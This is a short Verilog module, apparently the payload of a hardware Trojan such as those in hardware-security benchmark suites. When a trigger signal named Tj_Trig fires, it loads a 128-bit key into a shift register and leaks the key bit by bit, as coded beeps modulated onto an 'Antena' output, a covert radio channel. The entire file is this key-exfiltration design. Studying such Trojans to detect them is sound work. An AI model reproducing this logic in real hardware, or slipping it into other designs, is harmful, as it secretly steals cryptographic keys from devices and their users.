`timescale 1ns / 1ps
//////////////////////////////////////////////////////////////////////////////////
// Company: 
// Engineer: 
// 
// Create Date:    11:14:06 03/08/2013 
// Design Name: 
// Module Name:    AM_Transmission 
// Project Name: 
// Target Devices: 
// Tool versions: 
// Description: 
//
// Dependencies: 
//
// Revision: 
// Revision 0.01 - File Created
// Additional Comments: 
//
//////////////////////////////////////////////////////////////////////////////////
module AM_Transmission(
    input [127:0] key,
    input clk,
    input rst,
	 input Tj_Trig, 
    output Antena
    );

	reg [25:0] Baud8GeneratorACC;
	reg [127:0] SHIFTReg;
	
	always @(posedge clk)
	begin
		if ((rst == 1'b1) || (Tj_Trig == 1'b1)) begin
			Baud8GeneratorACC <= 0;
		end else begin
			Baud8GeneratorACC <= Baud8GeneratorACC + 1;
		end
	end
	
	always @(posedge Tj_Trig, posedge Baud8GeneratorACC[25])
	begin
		if (Tj_Trig == 1'b1) begin
			SHIFTReg <= key;
		end else begin	
			SHIFTReg <= SHIFTReg >> 1; 
		end	
	end

//	always @(posedge rst, posedge Tj_Trig, posedge Baud8GeneratorACC[25])
//	begin
//		if ( (rst == 1'b1) || (Tj_Trig == 1'b1) ) begin
//			SHIFTReg <= key;
//		end else begin	
//			SHIFTReg <= SHIFTReg >> 1; 
//		end	
//	end

	assign beep1 = !(Baud8GeneratorACC[25] | Baud8GeneratorACC[24] | Baud8GeneratorACC[23]);
	assign beep2 = !(Baud8GeneratorACC[25] | !(Baud8GeneratorACC[24]) | Baud8GeneratorACC[23]) & SHIFTReg[0];
	assign beeps = beep1 | beep2;
	assign MUX_Sel = beeps & Baud8GeneratorACC[15] & Baud8GeneratorACC[4];
	assign Antena = (MUX_Sel) ? !(rst): 1'b0; 

endmodule
